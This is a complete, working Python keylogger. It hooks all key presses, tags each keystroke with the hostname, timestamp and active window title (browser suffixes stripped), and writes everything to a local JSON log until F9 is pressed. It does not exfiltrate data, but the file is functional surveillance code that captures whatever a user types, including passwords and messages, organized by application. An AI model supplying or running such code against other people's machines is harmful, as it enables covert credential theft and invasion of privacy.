import keyboard, json, socket, os, re
from datetime import datetime
import pygetwindow as gw, unicodedata

class KeyLogger:
    def __init__(self, log_file="log.json"):
        self.log_file, self.machine_name, self.running = log_file, socket.gethostname(), True
        if os.path.exists(log_file):
            try: self.data = json.load(open(log_file, "r", encoding="utf-8"))
            except: self.data = {}
        else: self.data = {}

    def clean_title(self, title):
        if not title: return "Unknown"
        # מסיר תווים בלתי נראים + מספרים בתחילה + סיומות דפדפן
        title = "".join(c for c in title if unicodedata.category(c)[0] != "C")
        title = re.sub(r"^\(\d+\)\s*", "", title)
        return title.replace(" - Microsoft Edge","").replace(" - Google Chrome","").strip()

    def format_key(self, k):
        return {"space":" ", "enter":"\n", "backspace":"<BS>"}.get(k, k)

    def log_event(self, e):
        if not self.running: return
        date, minute, window = datetime.now().strftime("%Y-%m-%d"), datetime.now().strftime("%H:%M"), self.clean_title(getattr(gw.getActiveWindow(),"title",""))
        d = self.data.setdefault(self.machine_name, {}).setdefault(date, {}).setdefault(minute, {}).setdefault(window, "")
        self.data[self.machine_name][date][minute][window] = d + self.format_key(e.name)
        json.dump(self.data, open(self.log_file,"w",encoding="utf-8"), ensure_ascii=False, indent=4)

    def stop(self): os._exit(0)

    def start(self):
        keyboard.on_press(self.log_event)
        keyboard.add_hotkey("F9", self.stop)
        print("Keylogger started. Press F9 to stop.")
        keyboard.wait()

if __name__ == "__main__":
    KeyLogger().start()